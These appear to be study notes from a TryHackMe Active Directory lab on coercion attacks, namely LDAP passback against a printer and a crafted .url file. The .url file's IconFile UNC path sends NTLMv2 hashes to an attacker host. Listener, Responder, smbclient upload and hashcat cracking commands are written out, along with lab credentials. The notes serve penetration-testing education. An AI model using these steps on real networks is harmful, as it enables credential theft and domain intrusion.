# 🧲 Coercion Attacks

> **Topic:** Introduction to AD Breaching
>
> **Section:** Coercion Attacks

---

# 📖 Overview

Earlier techniques focused on:

- Discovering credentials
- Guessing credentials

Coercion takes a different approach.

Instead of finding or guessing credentials, the attacker attempts to:

> **Trick a device or user into sending authentication material to an attacker-controlled listener.**

This maps to:

```text
MITRE ATT&CK T1187
Forced Authentication
```

The source covers two beginner-friendly techniques:

1. LDAP passback
2. File-based coercion

---

# 🖨️ LDAP Passback

## What Is an LDAP Passback Attack?

Printers, scanners and multifunction peripherals often integrate with Active Directory using LDAP.

They may store an LDAP service account for:

- Scan-to-email
- Address-book lookups
- User authentication

An LDAP passback attack redirects the device's LDAP connection to an attacker-controlled listener.

---

# 🔄 LDAP Passback Flow

```text
Access Device
      ↓
LDAP Configuration
      ↓
Replace LDAP Server
      ↓
Attacker IP
      ↓
Trigger Test Connection
      ↓
Device Sends Stored Credentials
      ↓
Capture Credentials
```

---

# ⚠️ Why Does This Work?

Common weaknesses include:

## Default Admin Credentials

Devices may retain factory-default credentials.

Examples from the source include:

```text
admin:admin
```

and other vendor defaults.

---

## Over-Privileged Service Accounts

The LDAP service account may have excessive privileges.

In some environments, it may even be a Domain Admin.

---

## Plaintext LDAP

LDAP over:

```text
Port 389
```

can transmit credentials without encryption.

LDAPS uses:

```text
Port 636
```

and provides encrypted communication.

---

## No Credential Rotation

Device service-account passwords may remain unchanged for long periods.

A captured credential may therefore remain valid.

---

# 🧪 Performing LDAP Passback in the Lab

Printer:

```text
http://printer.thm.loc/
```

Lab credentials:

```text
admin:admin
```

Access the printer administration interface and locate the LDAP configuration.

Change the LDAP server IP to the attacker's:

```text
tun0
```

IP address.

The source uses port:

```text
3489
```

because the default LDAP port is already in use on the AttackBox.

---

# 🎧 Netcat Listener

Start:

```bash
nc -lvnp 3489
```

Then trigger the printer's:

```text
Test Connection
```

The device attempts to authenticate to the listener using its stored LDAP credentials.

---

# 📄 Captured Data

The lab may return:

```text
CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
```

along with the plaintext password.

The exact raw format depends on the device.

---

# ⚠️ Modern Device Consideration

Some modern devices use:

- SASL
- TLS-wrapped LDAP

A simple Netcat listener may not capture plaintext credentials in these situations.

The source notes that a rogue LDAP server such as:

```text
slapd
```

or:

```text
Impacket ldapd.py
```

may be required to handle the negotiation.

The TryHackMe lab uses plaintext LDAP, so Netcat is sufficient.

---

# 🔍 Verify Captured Credentials

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

A result such as:

```text
STATUS_ACCOUNT_DISABLED
```

can indicate that the credentials are valid but the account is disabled.

---

# 📁 File-Based Coercion

File-based coercion works by placing a specially crafted file on a writable network share.

When a user browses that share using Windows Explorer:

```text
Windows Explorer
       ↓
Renders File Icon
       ↓
External UNC Path
       ↓
SMB Authentication
       ↓
NTLMv2 Hash
       ↓
Attacker Listener
```

---

# 🔗 Why `.url` Files Work

`.url` files support an:

```text
IconFile
```

field.

If the field points to a UNC path on an attacker-controlled system, Windows can initiate an SMB authentication attempt while loading the icon.

---

# ⚠️ Historical File Types

The source notes that older techniques also used:

```text
.scf
desktop.ini
```

However, these vectors have been patched on fully updated Windows 10 and 11 systems.

The room uses:

```text
.url
```

as the current technique.

---

# 📝 Creating the Malicious `.url` File

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF
```

---

# 🔍 File Breakdown

```text
[InternetShortcut]
```

File type header.

```text
URL=http://thm.loc
```

Shortcut URL.

This is not the coercion mechanism.

```text
WorkingDirectory=thm
```

Working directory.

```text
IconFile=\\YOURTUN0IP\icons\icon.ico
```

The critical field.

The UNC path causes Windows to attempt SMB authentication when the icon is loaded.

```text
IconIndex=1
```

Icon index.

---

# ⚠️ Important `EOF` Detail

The source deliberately uses:

```text
'EOF'
```

with quotes.

This prevents Bash from interpreting the double backslashes in the UNC path incorrectly.

---

# 📌 Why `@Shortcut.url`?

The leading:

```text
@
```

causes the file to sort near the top of the directory listing.

This increases the chance that Windows Explorer renders its icon quickly.

---

# 🎧 Setting Up Responder

Responder is used to capture NTLMv2 authentication material.

Start:

```bash
sudo responder -I tun0
```

Responder listens on SMB port 445 and other protocols.

---

# 📤 Uploading the File

Connect to the writable SMB share:

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
```

Upload:

```text
smb: \> put @Shortcut.url
```

Exit:

```text
smb: \> exit
```

---

# 🧲 Capturing the NTLMv2 Hash

When a user browses the share, Windows Explorer attempts to load the icon.

Responder may capture:

```text
[SMB] NTLMv2-SSP Client   : 192.168.x.x
[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Hash     : sarah.jones::THM:1122334455667788:A1B2C3D4E5F6...[SNIP]
```

---

# 🔓 Net-NTLMv2

The captured material is:

```text
Net-NTLMv2
```

It cannot be used directly for Pass-the-Hash.

The source therefore proceeds with:

```text
Offline Cracking
```

---

# 🧮 Cracking with Hashcat

Save the captured hash to:

```text
hash.txt
```

Use Hashcat mode:

```text
5600
```

Command:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Example result:

```text
SARAH.JONES::THM:1122334455667788:A1B2C3D4E5F6...[SNIP]:CRACKED_PASSWORD
```

Once cracked, the result provides another valid set of AD credentials.

---

# 🧩 Advanced Coercion Techniques

The source mentions:

- PetitPotam
- PrinterBug / SpoolSample
- DFSCoerce

These can force Domain Controllers and other high-value machines to authenticate to an attacker-controlled listener.

When combined with relay attacks, they can form powerful AD attack chains.

---

# 💡 Key Takeaways

- Coercion forces authentication rather than guessing or discovering credentials.
- LDAP passback targets network devices that store LDAP credentials.
- Default device credentials are a major risk.
- Over-privileged LDAP service accounts increase impact.
- Plaintext LDAP can expose credentials.
- File-based coercion can abuse Windows Explorer icon loading.
- `.url` files support an `IconFile` UNC path.
- Responder can capture NTLMv2 authentication material.
- Net-NTLMv2 hashes must be cracked offline if password recovery is required.
- PetitPotam, PrinterBug/SpoolSample and DFSCoerce are more advanced coercion techniques.
